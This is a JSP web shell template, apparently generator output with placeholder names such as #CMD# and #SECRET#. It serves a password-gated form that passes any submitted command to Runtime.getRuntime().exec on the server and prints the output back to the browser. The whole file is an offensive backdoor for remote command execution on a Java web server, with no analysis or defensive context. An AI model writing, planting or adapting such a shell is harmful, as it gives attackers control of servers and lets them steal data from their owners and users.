<%@ page import="java.io.*" %>
<style>
    body { font-family: sans-serif; background: #1a1a1a; color: #00ff00; padding: 20px; }
    input { background: #333; color: #fff; border: 1px solid #555; padding: 5px; margin: 2px; }
    input[type="submit"] { background: #00ff00; color: #000; font-weight: bold; cursor: pointer; }
    pre { background: #000; padding: 10px; border: 1px solid #333; }
</style>
<form method="POST">
    <input type="password" name="#P#" placeholder="Password">
    <input type="text" name="#CMD#" placeholder="Command">
    <input type="submit" value="Execute">
</form>
<%
    String #PW# = request.getParameter("#P#");
    if (#PW# != null && #PW#.equals("#SECRET#")) {
        String #C# = request.getParameter("#CMD#");
        if (#C# != null && !#C#.isEmpty()) {
            Process #PR# = Runtime.getRuntime().exec(#C#);
            InputStream #I# = #PR#.getInputStream();
            BufferedReader #R# = new BufferedReader(new InputStreamReader(#I#));
            String #L#;
            out.println("<pre>");
            while ((#L# = #R#.readLine()) != null) {
                out.println(#L#);
            }
            out.println("</pre>");
        }
    }
%>